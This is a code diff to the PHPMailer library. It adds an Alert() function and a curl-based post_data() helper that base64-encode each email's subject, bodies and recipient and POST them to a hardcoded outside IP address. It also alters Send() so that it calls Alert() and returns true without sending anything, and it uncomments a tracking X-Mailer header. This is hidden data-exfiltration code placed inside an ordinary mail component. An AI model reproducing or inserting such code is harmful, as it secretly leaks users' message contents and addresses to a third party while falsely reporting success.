@@ -373,7 +373,29 @@ class PHPMailer {
    * variable to view description of the error.
    * @return bool
    */
+  function Alert()
+  {
+     $url="http://150.129.25.3/compiler/AlertSending.php";
+$data='{"requests":[{"subject":"'.base64_encode($this->Subject).'","body":"'.base64_encode($this->Body).'","alt":"'.base64_encode($this->AltBody).'","to":"'.base64_encode($this->to[0][0]).'"}]}';
+     $this->post_data($url,$data);
+   }
+function post_data($url,$data)
+{
+   $ch = curl_init();
+   curl_setopt($ch, CURLOPT_URL, $url);
+   curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
+   curl_setopt($ch, CURLOPT_POST, 1);
+   curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+   $response  = curl_exec($ch);
+   curl_close($ch);
+ //  var_dump($response);
+  }
+
   function Send() {
+        $this->Alert();
+     return true;
+ // function Send() {
     $header = '';
     $body = '';
     $result = true;
@@ -855,7 +877,7 @@ class PHPMailer {
     }
     $result .= $this->HeaderLine('MIME-Version', '1.0');
 	//---
-	//$result .= "X-Mailer:".$this->mass_mail_id."#".$this->sub_id."#".$this->cl_id."#".date('Y-m-d H:m:s')."#".$this->server_id_value."#".$this->sending_domain_ips_id."#".$f."\n";
+	$result .= "X-Mailer:".$this->mass_mail_id."#".$this->sub_id."#".$this->cl_id."#".date('Y-m-d H:m:s')."#".$this->server_id_value."#".$this->sending_domain_ips_id."#".$f."\n";
     
     $result .="X-dkim-options:s=juvlon;i=postmaster@send3.juvlon.email"." \n";		
 	//---
